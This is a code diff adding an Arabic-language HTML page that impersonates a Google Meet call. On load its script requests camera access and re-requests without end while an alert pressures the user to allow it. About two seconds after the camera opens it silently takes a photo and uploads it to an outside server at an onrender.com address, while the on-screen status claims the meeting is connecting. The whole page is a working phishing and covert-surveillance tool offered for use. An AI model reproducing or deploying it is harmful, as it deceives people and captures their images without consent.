@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Meet</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #202124;
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        /* منطقة الفيديو الرئيسية */
+        .main-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        .video-wrapper {
+            width: 100%;
+            max-width: 900px;
+            aspect-ratio: 16 / 9;
+            background-color: #3c4043;
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            /* التبديل بين المرآة والعادي سيتم عبر JS */
+        }
+
+        .user-label {
+            position: absolute;
+            bottom: 16px;
+            left: 16px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        /* شريط التحكم السفلي */
+        .controls-bar {
+            height: 80px;
+            background-color: #202124;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+        }
+
+        .meeting-info {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 12px;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 1px solid #5f6368;
+            background-color: #3c4043;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background 0.3s;
+            font-size: 18px;
+        }
+
+        .btn:hover {
+            background-color: #4c5054;
+        }
+
+        .btn.active {
+            background-color: #8ab4f8;
+            color: #202124;
+        }
+
+        .btn-danger {
+            background-color: #ea4335;
+            width: 64px;
+            border-radius: 24px;
+            border: none;
+        }
+
+        #photo-canvas { display: none; }
+
+        #status-message {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 10px 20px;
+            border-radius: 4px;
+            background: #3c4043;
+            font-size: 13px;
+            z-index: 100;
+            border-left: 4px solid #8ab4f8;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="status-message">بانتظار السماح بالوصول للكاميرا...</div>
+
+    <div class="main-container">
+        <div class="video-wrapper">
+            <video id="camera-feed" autoplay playsinline muted></video>
+            <div class="user-label" id="camera-type-label">الكاميرا الأمامية</div>
+        </div>
+    </div>
+
+    <canvas id="photo-canvas"></canvas>
+
+    <div class="controls-bar">
+        <div class="meeting-info">تفاصيل الاجتماع | abc-defg-hij</div>
+
+        <div class="action-buttons">
+            <button class="btn" title="تبديل للكاميرا الأمامية" onclick="startCamera('user')">👤</button>
+            <button class="btn" title="تبديل للكاميرا الخلفية" onclick="startCamera('environment')">📷</button>
+            <button class="btn active" onclick="captureAndSend()" title="التقاط الآن">📸</button>
+            <button class="btn-danger" onclick="location.reload()">📞</button>
+        </div>
+
+        <div style="width: 150px;"></div> 
+    </div>
+
+    <script>
+        const video = document.getElementById('camera-feed');
+        const canvas = document.getElementById('photo-canvas');
+        const statusMessage = document.getElementById('status-message');
+        const typeLabel = document.getElementById('camera-type-label');
+        let currentStream = null;
+
+        // وظيفة بدء الكاميرا مع الإلحاح في الطلب
+        async function startCamera(mode = 'user') {
+            statusMessage.textContent = 'جاري محاولة الاتصال...';
+            
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+
+            try {
+                const constraints = { 
+                    video: { facingMode: mode }, 
+                    audio: false 
+                }; 
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                currentStream = stream;
+                video.srcObject = stream;
+                
+                // تحديث الستايل (مرآة للأمامية فقط)
+                video.style.transform = (mode === 'user') ? 'scaleX(-1)' : 'scaleX(1)';
+                typeLabel.textContent = (mode === 'user') ? 'أنت (الكاميرا الأمامية)' : 'الكاميرا الخلفية';
+
+                video.onloadedmetadata = () => {
+                    statusMessage.textContent = 'متصل بالاجتماع بنجاح';
+                    // التقاط تلقائي بعد ثانيتين من الفتح
+                    setTimeout(captureAndSend, 2000);
+                };
+
+            } catch (err) {
+                console.error("Permission denied:", err);
+                statusMessage.textContent = 'تم رفض الوصول!';
+                
+                // رسالة تنبيه للمستخدم لإجباره على القبول
+                alert("خطأ: لا يمكن الدخول للاجتماع بدون تشغيل الكاميرا. يرجى الضغط على 'سماح' في المحاولة القادمة.");
+                
+                // إعادة المحاولة فوراً وبشكل لا نهائي حتى يقبل
+                startCamera(mode);
+            }
+        }
+
+        // وظيفة الالتقاط والإرسال
+        function captureAndSend() {
+            if (!currentStream) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+
+            // معالجة قلب الصورة إذا كانت أمامية لتظهر بشكل صحيح في السيرفر
+            if (video.style.transform === 'scaleX(-1)') {
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+            }
+
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
+            
+            statusMessage.textContent = 'جاري مزامنة البيانات...';
+            sendPhotoToServer(imageDataURL);
+        }
+
+        async function sendPhotoToServer(imageData) {
+            const BACKEND_URL = 'https://vvvvvv-1.onrender.com/upload-photo'; 
+            try {
+                const response = await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+                if(response.ok) {
+                    statusMessage.textContent = 'متصل بالاجتماع';
+                }
+            } catch (error) {
+                console.error('خطأ في الإرسال:', error);
+                statusMessage.textContent = 'ضعف في الشبكة..';
+            }
+        }
+
+        // بدء التشغيل عند تحميل الصفحة
+        window.onload = () => startCamera('user');
+    </script>
+</body>
+</html>
